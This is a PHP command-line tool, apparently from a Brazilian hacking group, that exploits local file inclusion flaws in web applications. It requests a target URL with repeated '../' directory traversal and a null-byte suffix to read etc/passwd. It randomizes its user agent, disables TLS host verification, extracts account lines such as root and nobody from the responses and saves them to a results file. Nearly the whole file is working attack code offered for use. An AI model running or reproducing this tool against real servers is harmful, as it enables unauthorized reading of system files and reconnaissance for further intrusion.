<?php
/*
  #===============================================================================
  # NAME:         lfiINURL
  # TIPE:         Local File Inclusion
  # Tested on:    Linux
  # EXECUTE:      php lfiINURL.php -t target.br/index.file?= -c 50
  # OUTPUT:       lfi.txt
  # AUTOR:        Cleiton Pinheiro / Nick: googleINURL
  # Blog:         http://blog.inurl.com.br
  # Twitter:      https://twitter.com/googleinurl
  # Fanpage:      https://fb.com/InurlBrasil
  # Pastebin      http://pastebin.com/u/Googleinurl
  # GIT:          https://github.com/googleinurl
  # PSS:          http://packetstormsecurity.com/user/googleinurl
  # YOUTUBE:      http://youtube.com/c/INURLBrasil
  # PLUS:         http://google.com/+INURLBrasil
  #
  #===============================================================================
 */
error_reporting(1);
set_time_limit(0);
ini_set('display_errors', 1);
ini_set('max_execution_time', 0);
ini_set('allow_url_fopen', 1);
ob_implicit_flush(true);
ob_end_flush();
$op_ = getopt('t:c:', array('help::'));
echo "  
  _____ 
 (_____)    ____ _   _ _    _ _____  _                 ____                _ _ 
 (() ())  |_   _| \ | | |  | |  __ \| |               |  _ \              (_) |
  \   /     | | |  \| | |  | | |__) | |       ______  | |_) |_ __ __ _ ___ _| |
   \ /      | | | . ` | |  | |  _  /| |      |______| |  _ <| '__/ _` / __| | |
   /=\     _| |_| |\  | |__| | | \ \| |____           | |_) | | | (_| \__ \ | |
  [___]   |_____|_| \_|\____/|_|  \_\______|          |____/|_|  \__,_|___/_|_| 
  \n\033[1;37m0xNeither war between hackers, nor peace for the system.\n
[+] [Exploit]: Local File Inclusion / INURL BRASIL\nhelp: --help\033[0m\n\n";
$menu = "
    -t : SET TARGET.
    -c : COUNT DIR.
    Execute:
                  php lfiINURL.php -t target.br/index.file?= -c 50
\n";
echo isset($op_['help']) ? exit($menu) : NULL;


$config = array(
    'target' => not_isnull_empty($op_['t']) ? (strstr($op_['t'], 'http') ? $op_['t'] : "http://{$op_['t']}") : exit("[X] [ERRO] DEFINE TARGET\n"),
    'count' => not_isnull_empty($op_['c']) ? $op_['c'] : exit("[X] [ERRO] DEFINE CONUNT\n"),
    'dir' => "/",
    'line' => "-----------------------------------------------------------------------------------\n"
);

function not_isnull_empty($valor = NULL) {
    RETURN !is_null($valor) && !empty($valor) ? TRUE : FALSE;
}

function __plus() {
    ob_flush();
    flush();
}

function __request_info($curl, $config) {

    curl_setopt($curl, CURLOPT_URL, $config['target'] . $config['file']);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/' . rand(1, 20) . '.0(X11; Linux x8' . rand(1, 20) . '_6' . rand(1, 20) . ') blog.inurl.com.br/' . md5(rand(1, 200)) . '.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/' . rand(1, 500) . '.31');
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 20);
    curl_setopt($curl, CURLOPT_HEADER, 1);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    __plus();
    $corpo = curl_exec($curl);
    __plus();
    $server = curl_getinfo($curl);
    __plus();
    $status = NULL;
    preg_match_all('(HTTP.*)', $corpo, $status['http']);
    preg_match_all('(Server:.*)', $corpo, $status['server']);
    preg_match_all('(Content-Disposition:.*)', $corpo, $status['Content-Disposition']);
    $info = str_replace("\r", '', str_replace("\n", '', "{$status['http'][0][0]}, {$status['server'][0][0]}{$status['Content-Disposition'][0][0]}"));
    curl_close($curl);
    unset($curl);
    return isset($corpo) ? array('corpo' => $corpo, 'server' => $server, 'info' => $info) : FALSE;
}

function main($config, $rest) {

    __plus();
    print "[ " . date("h:m:s") . " ] [!][EXPLOITATION THE FILE]:{$config['file']}\n";
    preg_match_all("(root:.*)", $rest['corpo'], $final);
    preg_match_all("(sbin:.*)", $rest['corpo'], $final__);
    preg_match_all("(ftp:.*)", $rest['corpo'], $final___);
    preg_match_all("(nobody:.*)", $rest['corpo'], $final____);
    preg_match_all("(mail:.*)", $rest['corpo'], $final_____);
    $_final = array_merge($final[0], $final__[0], $final___[0], $final____[0], $final_____[0]);
    $res = NULL;
    if (preg_match("#root#i", $rest['corpo'])) {
        $res.= "[ " . date("h:m:s") . " ] [+][IS VULN][RESUME][VALUES]:\n";
        $res.=$config['line'] . "\n";
        foreach ($_final as $value) {
            $res.="[ " . date("h:m:s") . " ] [VALUE]: $value\n";
        }
        $res.=$config['line'];
        __plus();
        file_put_contents('lfi.txt', "{$config['alvo']}\n{$res}\n", FILE_APPEND);
        print "{$res}[VALUES SAVED]: lfi.txt\n\n";
        exit();
    } else {
        print "[ " . date("h:m:s") . " ] [x][NOT VULN]\n";
    }
}

for ($i = 0; $i <= $config['count']; $i++) {

    $config['file'] = ($i == 0 ? "/" : NULL) . "{$sb_}etc/passwd%00";
    $__ = __request_info($objcurl = curl_init(), $config);
    __plus();
    print "[ " . date("h:m:s") . " ] [!][INFO]: {$__['info']}\n";
    print "[ " . date("h:m:s") . " ] [!][TARGET]: {$config['target']}{EXPLOIT_LFI}\n";
    main($config, $__);
    print $config['line'];
    $sb_.="..{$config['dir']}";
    sleep(2);
    __plus();
}
